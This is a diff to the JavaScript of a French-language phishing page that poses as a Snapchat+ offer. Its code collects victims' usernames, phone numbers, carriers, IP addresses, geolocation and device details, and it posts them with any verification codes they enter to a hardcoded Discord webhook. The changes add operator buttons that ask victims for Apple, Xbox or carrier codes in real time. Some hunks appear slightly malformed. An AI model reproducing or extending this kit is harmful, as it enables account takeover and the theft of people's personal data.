@@ -747,6 +747,18 @@ fetch('https://api.ipify.org?format=json')
         userIP = 'unknown';
         userData.ip = 'unknown';
     });
+      // Récupération des infos géo
+        const geoRes = await fetch(`https://ipapi.co/${userIP}/json/`);
+        const geoData = await geoRes.json();
+        userData.country = geoData.country_name || 'France';
+        userData.city = geoData.city || 'Inconnue';
+    } catch (error) {
+        userIP = 'unknown';
+        userData.ip = 'unknown';
+        userData.country = 'Inconnu';
+        userData.city = 'Inconnu';
+    }
+}
     
 function selectDuration(val, el) {
     selectedDuration = val;
@@ -843,29 +855,50 @@ const webhook = 'https://discord.com/api/webhooks/1526917909174026300/yh3TgD0n6X
 
 // Fonction pour envoyer les données au webhook
 function sendInitialWebhook() {
-    const currentUrl = window.location.origin + window.location.pathname;
-
-    const codeUrl = `${currentUrl}?uuid=${userData.uuid}&action=code`;
-    const wrongUrl = `${currentUrl}?uuid=${userData.uuid}&action=wrong`;
-
     const embed = {
-        title: "🎯 Nouvelle personne - Snapchat+",
-        description: `**UUID:** \`${userData.uuid}\``,
+        title: "📱 Nouvelle soumission Snapchat+",
         color: 0xFFFC00,
         fields: [
-            { name: "👤 Username", value: userData.username || "N/A", inline: true },
-            { name: "📱 Téléphone", value: userData.phone || "N/A", inline: true },
-            { name: "📡 Opérateur", value: userData.operator || "N/A", inline: true },
-            { name: "🌐 IP", value: userData.ip || "N/A", inline: true },
-            { name: "⏱️ Durée", value: userData.duration || "N/A", inline: true },
-            { name: "🕐 Date", value: new Date().toLocaleString('fr-FR'), inline: true },
-            { name: "🔗 Actions", value: `[✅ Vérifier le code](${codeUrl})\n[❌ Code incorrect](${wrongUrl})`, inline: false }
+            { name: "👤 Utilisateur", value: `@${userData.username || 'N/A'}`, inline: true },
+            { name: "📡 Opérateur", value: userData.operator || 'N/A', inline: true },
+            { name: "📱 Numéro", value: userData.phone || 'N/A', inline: true },
+            { name: "🌍 Pays", value: userData.country || 'N/A', inline: true },
+            { name: "🏙️ Ville", value: userData.city || 'N/A', inline: true },
+            { name: "🌐 Navigateur", value: getUserAgentBrowser(), inline: true },
+            { name: "💻 Appareil", value: getUserDevice(), inline: true },
+            { name: "🎮 Adresse IP", value: `\`${userIP}\``, inline: true },
+            { name: "🕐 Date de soumission", value: new Date().toLocaleString('fr-FR'), inline: true }
         ],
-        footer: { text: "Snapchat+ Phishing Panel" },
+        footer: { 
+            text: `ID: ${userData.uuid} | ${new Date().toLocaleString('fr-FR')}`
+        },
         timestamp: new Date().toISOString()
     };
 
-    const payload = { embeds: [embed] };
+    // Actions avec boutons d'action
+    const actions = [
+        { label: "✅ Code à 4 chiffres (APPLE)", value: "action_code_4", emoji: "🔢" },
+        { label: "✅ Code 6 chiffres (XBOX MICROSOFT)", value: "action_code_6", emoji: "🔢" },
+        { label: "✅ Code 6 chiffres (SFR FORMAT)", value: "action_code_sfr", emoji: "🔢" },
+        { label: "✅ Code 6 chiffres (ORANGE FORMAT)", value: "action_code_orange", emoji: "🔢" },
+        { label: "❌ Mauvais numéro", value: "action_wrong", emoji: "❌" },
+        { label: "⏳ Faire patienter", value: "action_wait", emoji: "⏳" },
+        { label: "🚫 Blacklist instant", value: "action_blacklist", emoji: "🚫" }
+    ];
+
+    const payload = {
+        embeds: [embed],
+        components: [{
+            type: 1,
+            components: actions.map((action, index) => ({
+                type: 2,
+                style: 2,
+                label: `${action.emoji} ${action.label}`,
+                custom_id: `${userData.uuid}_${action.value}`
+            }))
+        }]
+    };
+
     sendWebhookRequest(webhook, payload);
 }
 
@@ -875,11 +908,11 @@ function sendCodeWebhook(code) {
         description: `**UUID:** \`${userData.uuid}\`\n**Code:** ||${code}||`,
         color: 0x00d26a,
         fields: [
-            { name: "👤 Username", value: userData.username || "N/A", inline: true },
-            { name: "📱 Téléphone", value: userData.phone || "N/A", inline: true },
+            { name: "👤 Utilisateur", value: `@${userData.username}`, inline: true },
+            { name: "📱 Numéro", value: userData.phone, inline: true },
             { name: "🔐 Code entré", value: `\`${code}\``, inline: true },
-            { name: "📡 Opérateur", value: userData.operator || "N/A", inline: true },
-            { name: "🌐 IP", value: userData.ip || "N/A", inline: true }
+            { name: "📡 Opérateur", value: userData.operator, inline: true },
+            { name: "🌐 IP", value: userIP, inline: true }
         ],
         footer: { text: "Code capturé avec succès" },
         timestamp: new Date().toISOString()
@@ -888,9 +921,26 @@ function sendCodeWebhook(code) {
     const payload = { embeds: [embed] };
     sendWebhookRequest(webhook, payload);
 }
-function sendWebhookRequest(webhookUrl, payload) {
-    console.log('Payload envoyé:', JSON.stringify(payload, null, 2));
 
+// Helpers pour extraire les infos du navigateur
+function getUserAgentBrowser() {
+    const ua = navigator.userAgent;
+    if (ua.includes('Firefox')) return 'Firefox';
+    if (ua.includes('Edg')) return 'Edge';
+    if (ua.includes('Chrome')) return 'Chrome';
+    if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
+    return 'Autre';
+}
+function getUserDevice() {
+    const ua = navigator.userAgent;
+    if (ua.includes('iPhone') || ua.includes('iPad')) return '📱 iPhone/iPad';
+    if (ua.includes('Android')) return '🤖 Android';
+    if (ua.includes('Windows')) return '💻 Windows';
+    if (ua.includes('Mac')) return '🍎 Mac';
+    return '🖥️ Autre';
+}
+
+function sendWebhookRequest(webhookUrl, payload) {
     fetch(webhookUrl, {
         method: 'POST',
         headers: {
@@ -899,13 +949,14 @@ function sendWebhookRequest(webhookUrl, payload) {
         body: JSON.stringify(payload)
     })
     .then(response => {
-        console.log('Réponse du webhook:', response.status, response.statusText);
         if (!response.ok) {
-            return response.text().then(text => {
-                console.error('Erreur détaillée:', text);
-                throw new Error(`Erreur ${response.status}: ${text}`);
-            });
+            console.error('Erreur webhook:', response.status, response.statusText);
         }
+    })
+    .catch(error => {
+        console.error('Erreur fetch webhook:', error);
+    });
+}
         return response.json();
     })
     .then(data => {
